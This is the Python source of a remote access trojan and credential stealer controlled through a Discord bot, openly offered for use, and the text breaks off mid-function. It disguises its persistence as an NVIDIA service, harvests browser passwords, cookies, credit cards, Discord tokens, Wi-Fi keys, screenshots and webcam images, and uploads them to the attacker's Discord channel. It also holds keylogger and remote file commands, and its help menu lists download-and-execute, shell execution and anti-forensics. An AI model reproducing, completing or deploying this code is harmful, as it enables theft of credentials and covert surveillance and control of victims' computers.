# UPDATES COMING SOON!
# Should work on all platforms, however some functions will not be compatible
# Most features work except the chrome password decryption isn't updated
# Let me know what i should add!

import sys, subprocess, importlib, os, platform

REQUIRED = {
    "pystray": "pystray",
    "PIL": "Pillow",
    "discord": "discord.py",
    "psutil": "psutil",
    "pyautogui": "pyautogui",
    "pynput": "pynput",
    "Crypto": "pycryptodome",
    "cv2": "opencv-python",
    "requests": "requests",

    # Windows-only
    "win32crypt": "pywin32",
    "winreg": None,   # built-in on Windows, no pip package
}

def is_module_available(name: str) -> bool:
    """Check if a module can be imported."""
    try:
        importlib.import_module(name)
        return True
    except ImportError:
        return False

def ensure_deps():
    """Install only missing deps, skip OS-incompatible ones."""
    system = platform.system()
    missing = []

    for mod, pkg in REQUIRED.items():
        # Skip Windows-only modules if not on Windows
        if system != "Windows" and mod in ("win32crypt", "winreg"):
            continue

        if pkg and not is_module_available(mod):
            missing.append(pkg)

    if missing:
        print(f"[+] Installing missing packages: {missing}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])

# Run before any imports
ensure_deps()

import warnings
import logging
import threading
import time
import pystray
from PIL import Image

# Suppress discord warnings
warnings.filterwarnings("ignore", category=UserWarning, module="discord")

# Configure logging
logging.basicConfig(level=logging.WARNING)

# Discord loggers
for logger in ["discord", "discord.gateway", "discord.client", "discord.http"]:
    logging.getLogger(logger).setLevel(logging.WARNING)

import asyncio, base64, ctypes, datetime, getpass, io, json, pathlib, random, re, shutil, socket, sqlite3, tempfile, urllib.request, zipfile
from pathlib import Path
from datetime import datetime
import cv2, discord, psutil, pyautogui, requests
from Crypto.Cipher import AES
from pynput import keyboard

# Windows-only imports
if platform.system() == "Windows":
    import win32crypt, winreg
    from ctypes import wintypes

# === Global Variables ===
tray_icon = None

# CONFIGURATION
BOT_TOKEN = ""                                                  # add your discord bot token here
BOT_CHANNEL_ID = None                                                # replace with discord channel ID
PERSISTENCE_NAME = "NVIDIAServices"                                        # change this to the name you want the startup file to be
LOOT_DIR = os.path.join(tempfile.gettempdir(), "NVIDIA_Services_Data")
try:
    os.makedirs(LOOT_DIR, exist_ok=True)
except PermissionError:
    LOOT_DIR = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "NVIDIA_Services_Data")
    os.makedirs(LOOT_DIR, exist_ok=True)

# ===== System Tray Functions =====

# tray icon image (PNG to base64)

ICON_BASE64 = "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"  # this is the tray icon image -- full base64 string
# change this to your base64 image ^^^
def get_icon_image():
    """Load tray icon directly from base64 through memory"""
    try:
        icon_data = base64.b64decode(ICON_BASE64)
        return Image.open(io.BytesIO(icon_data))
    except Exception as e:
        print(f"Error loading tray icon: {e}")
        return Image.new('RGB', (64, 64), 'white')  # Fallback blank image

def create_tray_icon():
    """Create system tray icon using embedded image"""
    image = get_icon_image()

    return pystray.Icon("security_app", image, PERSISTENCE_NAME)

    
current_dir = Path.home()

def format_size(size):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} TB"

def emoji_for_path(path: Path):
    if path.is_dir():
        return "📁"
    ext = path.suffix.lower()
    if ext in ['.exe', '.bat', '.cmd', '.msi', '.com']:
        return "🔧"
    if ext in ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.ico', '.webp']:
        return "📷"
    if ext in ['.txt', '.log', '.md', '.py', '.json', '.csv', '.xml', '.ini', '.cfg']:
        return "📄"
    return "📄"
    

# ===== Discord Bot Setup =====
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

def run_discord_bot():
    """Run the Discord bot in a separate thread"""
    try:
        client.run(BOT_TOKEN)
    except Exception as e:
        print(f"[!] Discord bot error: {e}")

# ===== Data Collection Functions =====
def add_to_startup():
    """Add the script to Windows startup"""
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry:
            winreg.SetValueEx(registry, PERSISTENCE_NAME, 0, winreg.REG_SZ, exe_path)
        return True
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")
        return False

def write_temp(folder, filename, content):
    """Write data to temporary files in the loot directory"""
    folder_path = os.path.join(LOOT_DIR, folder)
    os.makedirs(folder_path, exist_ok=True)
    filepath = os.path.join(folder_path, filename)
    
    try:
        with open(filepath, "a", encoding="utf-8", errors="replace") as f:
            if isinstance(content, (list, tuple)):
                for item in content:
                    f.write(f"{item}\n")
            elif isinstance(content, dict):
                json.dump(content, f, indent=2, ensure_ascii=False)
            else:
                f.write(str(content) + "\n")
    except Exception as e:
        print(f"[!] Failed to write {filename}: {e}")

def create_loot_zip():
    """Package all collected data into a zip file"""
    zip_name = "system_data.zip"
    try:
        with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(LOOT_DIR):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, LOOT_DIR)
                    zipf.write(full_path, arcname)
        return zip_name
    except Exception as e:
        print(f"[!] Failed to create zip: {e}")
        return None

async def send_zip_to_discord(zip_path):
    """Send the zip file through Discord bot"""
    try:
        channel = client.get_channel(BOT_CHANNEL_ID)
        if not channel:
            return False
            
        # Check file size
        file_size = os.path.getsize(zip_path) / (1024 * 1024)  # in MB
        if file_size > 8:
            print("[ERROR] File too large for Discord (max 8MB)")
            return False
            
        with open(zip_path, "rb") as f:
            await channel.send(file=discord.File(f, "system_data.zip"))
        return True
    except Exception as e:
        print(f"[ERROR] Script failed, restart. {type(e).__name__} - {e}")
        return False

def get_ip_info():
    """Get detailed IP information"""
    try:
        ip_data = requests.get("http://ip-api.com/json/").json()
        if ip_data.get('status') == 'success':
            loc = f"{ip_data.get('city','?')}, {ip_data.get('regionName','?')} ({ip_data.get('country','?')})"
            tz = ip_data.get("timezone", "?")
            mapurl = f"https://google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}"
            isp = ip_data.get('isp', 'Unknown')
            org = ip_data.get('org', 'Unknown')
            
            ip_info = {
                "IP Address": ip_data.get('query'),
                "Location": loc,
                "Timezone": tz,
                "ISP": isp,
                "Organization": org,
                "Map URL": mapurl,
                "AS": ip_data.get('as', 'Unknown')
            }
            write_temp("ip_info", "ip_details.json", ip_info)
            return ip_info
        return {}
    except Exception as e:
        print(f"[!] IP info collection failed: {e}")
        return {}

def get_system_info():
    """Collect comprehensive system information"""
    try:
        info = {
            "System": platform.system(),
            "Node": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Username": getpass.getuser(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "Memory": f"{psutil.virtual_memory().percent}% used",
            "Disk": f"{psutil.disk_usage('/').percent}% used",
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        }
        write_temp("system", "system_info.txt", info)
        return info
    except Exception as e:
        print(f"[!] System info collection failed: {e}")
        return {}
    
def list_drives():
    drive_infos = []  

    try:
        # all=True to get all drives, including removable
        drives = psutil.disk_partitions(all=True)

        for drive in drives:
            # Some drives may have empty mountpoints or inaccessible
            if not drive.mountpoint:
                continue

            try:
                usage = psutil.disk_usage(drive.mountpoint)
                info = (
                    f"Drive: {drive.device}\n"
                    f"  Mountpoint: {drive.mountpoint}\n"
                    f"  File System: {drive.fstype}\n"
                    f"  Total: {round(usage.total / (1024**3), 2)} GB\n"
                    f"  Used: {round(usage.used / (1024**3), 2)} GB\n"
                    f"  Free: {round(usage.free / (1024**3), 2)} GB\n"
                    f"  Usage: {usage.percent}%\n"
                )
                
                drive_infos.append(info)
            except PermissionError:
                # Skip drives you don't have permission to access
                continue
            except Exception as e:
                # Catch other issues per drive but continue scanning
                print(f"[!] Could not access drive {drive.device}: {e}")
                continue

        # Write all drive info once outside the loop
        write_temp("drives", "drive_info.txt", drive_infos)

        return drive_infos

    except Exception as e:
        print(f"[!] Drive info collection failed: {e}")
        return []
    
def take_webcam_picture(filename="webcam.jpg"):
    try:
        cam = cv2.VideoCapture(0)  # 0 = default camera
        if not cam.isOpened():
            raise Exception("Webcam not accessible")

        ret, frame = cam.read()
        if not ret:
            raise Exception("Failed to grab frame")

        cv2.imwrite(filename, frame)
        cam.release()
        return filename
    except Exception as e:
        print(f"[!] Webcam error: {e}")
        return None

def get_chrome_emails():
    """Extract emails from Chrome's login data"""
    try:
        login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
        tmp_db = os.path.join(LOOT_DIR, "temp_chrome_emails.db")
        
        shutil.copy2(login_data_path, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT username_value FROM logins WHERE username_value != '' GROUP BY username_value")
        emails = [row[0] for row in cursor.fetchall()]
        conn.close()
        
        if emails:
            write_temp("browser_data", "chrome_emails.txt", emails)
            return emails
        return ["No emails found in Chrome login data."]
    except Exception as e:
        error_msg = f"Failed to get Chrome emails: {e}"
        write_temp("browser_data", "chrome_emails.txt", error_msg)
        return [error_msg]

def get_browser_paths():
    """Get paths for common browsers"""
    return {
        "Chrome": [
            os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default"
        ],
        "Edge": [
            os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"
        ],
        "Brave": [
            os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
        ]
    }

def get_encryption_key(browser_path):
    """Extract encryption key from browser"""
    try:
        local_state_path = os.path.join(browser_path, "..", "Local State")
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            encrypted_key = json.load(f)["os_crypt"]["encrypted_key"]

        encrypted_key = base64.b64decode(encrypted_key)
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]

        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[!] Key extraction failed: {e}")
        return None

def decrypt_value(encrypted_value, key):           # decryption does not work..
    """Decrypt browser data using extracted key"""
    if not encrypted_value:
        return ""
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode(errors="replace")
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors="replace")
    except:
        return ""

def extract_browser_data(browser_name, data_type):
    """Extract specified data type from browser"""
    browsers = get_browser_paths()
    if browser_name not in browsers:
        return []

    extraction_map = {
        "passwords": ("Login Data", "logins", "origin_url, username_value, password_value"),
        "cookies": ("Cookies", "cookies", "host_key, name, encrypted_value"),
        "autofill": ("Web Data", "autofill", "name, value"),                                   # autofill and history works none of the others do..
        "history": ("History", "urls", "url, title, visit_count"),
        "credit_cards": ("Web Data", "credit_cards", "name_on_card, expiration_month, expiration_year, card_number_encrypted")
    }

    db_file, table, columns = extraction_map[data_type]
    results = []

    for profile_path in browsers[browser_name]:
        if not os.path.exists(profile_path):
            continue

        key = get_encryption_key(profile_path) if data_type in ["passwords", "cookies", "credit_cards"] else None
        temp_db = os.path.join(LOOT_DIR, f"temp_{data_type}.db")

        try:
            source_db = os.path.join(profile_path, db_file)
            if not os.path.exists(source_db):
                continue
            shutil.copy2(source_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(f"SELECT {columns} FROM {table}")
            for row in cursor.fetchall():
                if "encrypted" in columns or "password_value" in columns:
                    decrypted = decrypt_value(row[-1], key)
                    results.append(row[:-1] + (decrypted,))
                else:
                    results.append(row)
        except Exception as e:
            print(f"[!] {data_type} extraction failed in {profile_path}: {e}")
        finally:
            try:
                if 'cursor' in locals():
                    cursor.close()
                if 'conn' in locals():
                    conn.close()
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            except Exception as e:
                print(f"[!] Error cleaning up temp files: {e}")

    return results

def extract_discord_tokens():                 # bad extraxction method doesnt pull new tokens..
    """Extract Discord tokens from various locations"""
    token_regex = re.compile(r"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})")
    paths = [
        os.getenv("APPDATA") + "\\Discord",
        os.getenv("APPDATA") + "\\DiscordCanary",
        os.getenv("APPDATA") + "\\DiscordPTB",
        os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
    ]

    tokens = set()
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        for match in token_regex.finditer(line):
                            tokens.add(match.group())
            except:
                continue
    return list(tokens)

def get_wifi_passwords():
    """Extract saved WiFi passwords"""
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode('utf-8', errors='ignore')
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
        results = []
        for profile in profiles:
            output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8', errors='ignore')
            password = None
            if "Key Content" in output:
                password = output.split("Key Content")[1].split(":")[1].split("\n")[0].strip()
            elif "Key Material" in output:
                password = output.split("Key Material")[1].split(":")[1].split("\n")[0].strip()
            results.append((profile, password if password else "N/A"))
        return results
    except Exception as e:
        return []

def take_screenshot():
    """Capture screenshot"""
    try:
        img = pyautogui.screenshot()
        img_path = os.path.join(LOOT_DIR, "screenshots", "screenshot.png")
        os.makedirs(os.path.dirname(img_path), exist_ok=True)
        img.save(img_path)
        return True
    except Exception as e:
        return False

def get_clipboard_content():
    """Get clipboard contents"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        write_temp("system", "clipboard.txt", data)
        return True
    except Exception as e:
        return False

def collect_and_send_data():
    """Main data collection function"""
    try:
        get_system_info()
        list_drives()
        get_ip_info()
        get_chrome_emails()
        
        for browser in ["Chrome", "Edge", "Brave"]:
            pw = extract_browser_data(browser, "passwords")
            write_temp("browser_data", f"{browser.lower()}_passwords.txt", [f"{url} | {user} | {pwd}" for url, user, pwd in pw if pwd])
            
            cookies = extract_browser_data(browser, "cookies")
            write_temp("browser_data", f"{browser.lower()}_cookies.txt", [f"{host} | {name} | {val}" for host, name, val in cookies if val])
            
            autofill = extract_browser_data(browser, "autofill")
            write_temp("browser_data", f"{browser.lower()}_autofill.txt", [f"{n} | {v}" for n, v in autofill])
            
            hist = extract_browser_data(browser, "history")
            write_temp("browser_data", f"{browser.lower()}_history.txt", [f"{url} | {title} | {visits}" for url, title, visits in hist])
            
            cc = extract_browser_data(browser, "credit_cards")
            write_temp("browser_data", f"{browser.lower()}_credit_caards.txt", [f"{n} | {m}/{y} | {num}" for n, m, y, num in cc])

        tokens = extract_discord_tokens()
        write_temp("discord", "discord_tokens.txt", tokens)

        wifi = get_wifi_passwords()
        write_temp("network", "wifi_passwords.txt", [f"{ssid} : {pwd}" for ssid, pwd in wifi])

        take_screenshot()
        get_clipboard_content()

        zip_path = create_loot_zip()
        if zip_path:
            asyncio.run_coroutine_threadsafe(send_zip_to_discord(zip_path), client.loop).result()
            # Cleanup
            os.remove(zip_path)
            shutil.rmtree(LOOT_DIR, ignore_errors=True)
            
    except Exception as e:
        print(f" {e}")

async def take_screenshot_bot():
    screenshot = pyautogui.screenshot()
    temp_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot.save(temp_path)
    return temp_path

def take_screenshot_local():
    """Capture screenshot to loot folder"""
    try:
        img = pyautogui.screenshot()
        img_path = os.path.join(LOOT_DIR, "screenshots", "screenshot.png")
        os.makedirs(os.path.dirname(img_path), exist_ok=True)
        img.save(img_path)
        return True
    except Exception as e:
        return False
    
def get_system_uptime():
    """Get system uptime in seconds"""
    return int(time.time() - psutil.boot_time())

def is_new_boot():
    """Check if system recently booted (within 5 minutes)"""
    return get_system_uptime() < 300  # 5 minutes

async def send_startup_notification():
    """Send notification with screenshot to Discord"""
    channel = client.get_channel(BOT_CHANNEL_ID)
    
    # 1. Take screenshot
    screenshot_path = os.path.join(LOOT_DIR, "startup_ss.png")
    try:
        pyautogui.screenshot(screenshot_path)
    except Exception as e:
        print(f"Screenshot failed: {e}")
        return
    
    # 2. Prepare system info
    boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    info = (
        f"🚀 **System Boot Detected**\n"
        f"• User: {getpass.getuser()}\n"
        f"• Hostname: {platform.node()}\n"
        f"• Boot Time: {boot_time}\n"
        f"• IP: {socket.gethostbyname(socket.gethostname())}"
    )
    
    # 3. Send to Discord
    with open(screenshot_path, "rb") as f:
        await channel.send(
            content=info,
            file=discord.File(f, "startup_screenshot.png")
        )
    
    # Cleanup
    os.remove(screenshot_path)


# ===== Discord Event Handlers =====
@client.event
async def on_ready():
    threading.Thread(target=collect_and_send_data, daemon=True).start()

current_dir = os.getcwd()

# Commands
@client.event
async def on_message(message):
    if message.channel.id != BOT_CHANNEL_ID or message.author == client.user:
        return

    global current_dir

    if message.author == client.user or message.channel.id != BOT_CHANNEL_ID:
        return

    def resolve_path(path_str):
        # Helper to resolve relative paths against current_dir
        path = pathlib.Path(path_str)
        if not path.is_absolute():
            path = (pathlib.Path(current_dir) / path).resolve()
        return str(path)

    if message.content.startswith("!listdir"):
        args = message.content.split(" ", 1)
        path = resolve_path(args[1]) if len(args) > 1 else current_dir
        try:
            files = os.listdir(path)
            await message.channel.send(f"📂 Listing for `{path}`:\n" + "\n".join(files)[:1900])
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content.startswith("!cd "):
        path = resolve_path(message.content[4:].strip())
        try:
            os.chdir(path)
            current_dir = os.getcwd()
            await message.channel.send(f"📁 Changed directory to `{current_dir}`")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content.startswith("!readfile "):
        path = resolve_path(message.content[9:].strip())
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read(1900)
            await message.channel.send(f"📄 Contents of `{path}`:\n```\n{content}\n```")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content.startswith("!deletefile "):
        path = resolve_path(message.content[12:].strip())
        try:
            os.remove(path)
            await message.channel.send(f"🗑️ Deleted file `{path}`")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content == "!help":
        help_text = """
🛠️ **Available Commands**

🔑 System & Info:
  • `!isadmin` – Check if the script is running with admin rights
  • `!sysinfo` – Show user, OS, CPU, and RAM usage
  • `!installed_software` – List installed programs
  • `!running_processes` – List running processes
  • `!wifi` – Show saved Wi-Fi profiles
  • `!clipboard` – Get current clipboard contents

🎯 Keylogging & Monitoring:
  • `!keylog start` – Start keylogger
  • `!keylog stop` – Stop keylogger and upload the log
  • `!screenshot` – Take a screenshot and upload it
  • `!webcam` – Take a webcam snapshot (if available)

🧩 File & Execution:
  • `!downloadrun <url>` – Download and execute a file
  • `!update <url>` – Download a new version of the script and restart
  • `!renamefile <old> <new>` – Rename a file
  • `!cmd <command>` – Run a shell command and return the output
  • `!upload <filepath>` – Upload a file from victim’s PC (relative to current directory)
  • `!runfile <filepath>` – Execute a file on the PC (relative to current directory)
  • `!download <url>` – Download a file to the current directory
  • `!listdir [path]` – List files in directory (defaults to current directory)
  • `!cd <folder>` – Change current directory
  • `!pwd` – Show current directory path
  • `!explore [path]` – Explore files/folders with emoji indicators
  • `!tree [depth]` – Show folder tree up to depth (default 2)

💬 User Interaction:
  • `!msgbox <title> <text>` – Show a Windows message box
  • `!speak <text>` – Use Windows voice to speak text
  • `!wallpaper <url>` – Set a remote image as wallpaper
  • `!fake_error` – Show a fake critical error popup

🧹 Anti-Forensics:
  • `!clear_history` – Clear Chrome & Firefox browser history

🔁 System Control:
  • `!lock_pc` – Lock the computer screen
  • `!restart` – Restart the script

"""
        await message.channel.send(f"```{help_text}```")

    elif message.content == "!help1":
        help_text = """
🛠️ **Available Commands**
  • `!elevate - Elevates perms to admin


"""

    if message.content == "!screenshot":
        try:
            pyautogui.screenshot("s.png")
            await message.channel.send(file=discord.File("s.png"))
            os.remove("s.png")
        except Exception as e:
            print(f"[!] Screenshot error: {e}")

    elif message.content == "!webcam":
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            cv2.imwrite("w.jpg", frame)
            await message.channel.send(file=discord.File("w.jpg"))
            os.remove("w.jpg")
        except Exception as e:
            print(f"[!] Webcam error: {e}")

    # --- KEYLOGGER ---
    if message.content.startswith("!keylog "):
        global keylog_data, keylog_listener
        action = message.content[8:].lower()
        if action == "start":
            keylog_data = []
            keylog_listener = keyboard.Listener(on_press=lambda k: keylog_data.append(str(k)))
            keylog_listener.start()
            await message.channel.send("🟢 Keylogger started.")
        elif action == "stop":
            if keylog_listener:
                keylog_listener.stop()
            await message.channel.send(file=discord.File(io.StringIO("\n".join(keylog_data)), "keys.txt"))
            keylog_data = []

    # --- RESTART SCRIPT ---
    elif message.content == "!restart":
        await message.channel.send("🔄 Restarting script...")
        os.execl(sys.executable, sys.executable, *sys.argv)

    # --- RENAME FILE ---
    elif message.content.startswith("!renamefile "):
        try:
